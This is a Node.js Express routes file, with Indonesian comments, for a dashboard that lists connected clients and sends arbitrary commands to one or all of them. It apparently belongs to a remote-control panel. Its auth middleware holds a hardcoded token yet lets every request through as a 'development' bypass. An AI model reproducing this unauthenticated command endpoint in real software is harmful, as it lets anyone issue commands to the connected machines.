// ================================================================
// API ROUTES
// REST API endpoints for dashboard
// ================================================================

const express = require('express');
const clientController = require('../controllers/clientController');
const commandController = require('../controllers/commandController');

const router = express.Router();

// ================================================================
// MIDDLEWARE
// ================================================================

function requireAuth(req, res, next) {
    // Simple auth check - bisa ditambah token nanti
    const token = req.headers['authorization'];
    if (token && token === 'Bearer alzzxnxx_secret_2026') {
        return next();
    }
    // Bypass untuk development
    return next();
}

router.use(requireAuth);

// ================================================================
// CLIENT ROUTES
// ================================================================

// GET all clients
router.get('/clients', (req, res) => {
    const stats = clientController.getStats();
    const clients = clientController.toPublicJSON();
    res.json({
        success: true,
        stats: stats,
        clients: clients
    });
});

// GET single client
router.get('/clients/:id', (req, res) => {
    const client = clientController.get(req.params.id);
    if (!client) {
        return res.status(404).json({ success: false, error: 'Client tidak ditemukan' });
    }
    res.json({ success: true, client: client.toJSON() });
});

// DELETE client
router.delete('/clients/:id', (req, res) => {
    const deleted = clientController.delete(req.params.id);
    if (!deleted) {
        return res.status(404).json({ success: false, error: 'Client tidak ditemukan' });
    }
    res.json({ success: true, message: 'Client dihapus' });
});

// ================================================================
// COMMAND ROUTES
// ================================================================

// POST send command to client
router.post('/command', (req, res) => {
    const { target, command, data } = req.body;

    if (!target || !command) {
        return res.status(400).json({
            success: false,
            error: 'target dan command wajib diisi'
        });
    }

    const result = commandController.sendCommand(target, command, data);
    res.json(result);
});

// POST send command to all clients
router.post('/command/all', (req, res) => {
    const { command, data } = req.body;

    if (!command) {
        return res.status(400).json({
            success: false,
            error: 'command wajib diisi'
        });
    }

    const result = commandController.sendToAll(command, data);
    res.json(result);
});

// GET available commands
router.get('/commands', (req, res) => {
    const commands = commandController.getAvailableCommands();
    const help = {};
    commands.forEach(cmd => {
        help[cmd] = commandController.getCommandHelp(cmd);
    });
    res.json({
        success: true,
        commands: help
    });
});

// GET command logs
router.get('/logs', (req, res) => {
    const limit = parseInt(req.query.limit) || 50;
    const clientId = req.query.clientId || null;

    let logs;
    if (clientId) {
        logs = commandController.getLogsByClient(clientId, limit);
    } else {
        logs = commandController.getLogs(limit);
    }

    res.json({
        success: true,
        count: logs.length,
        logs: logs
    });
});

// ================================================================
// STATS ROUTES
// ================================================================

// GET server stats
router.get('/stats', (req, res) => {
    const clients = clientController.getStats();
    const commands = commandController.getLogs(1);

    res.json({
        success: true,
        server: {
            uptime: process.uptime(),
            timestamp: new Date().toISOString()
        },
        clients: clients,
        commands: {
            total: commandController.commandLog.length,
            latest: commands.length > 0 ? commands[0] : null
        }
    });
});

// GET dashboard data (all in one)
router.get('/dashboard', (req, res) => {
    const clients = clientController.toPublicJSON();
    const stats = clientController.getStats();
    const logs = commandController.getLogs(20);

    res.json({
        success: true,
        stats: stats,
        clients: clients,
        logs: logs,
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

// ================================================================
// CLEANUP
// ================================================================

// POST cleanup expired clients
router.post('/cleanup', (req, res) => {
    const timeout = parseInt(req.body.timeout) || 60000;
    const cleaned = clientController.cleanup(timeout);
    res.json({
        success: true,
        message: `Cleaned ${cleaned} expired clients`,
        cleaned: cleaned
    });
});

// ================================================================
// HEALTH
// ================================================================

router.get('/health', (req, res) => {
    const stats = clientController.getStats();
    res.json({
        success: true,
        status: 'online',
        version: '1.0.0',
        clients: stats,
        timestamp: new Date().toISOString()
    });
});

module.exports = router;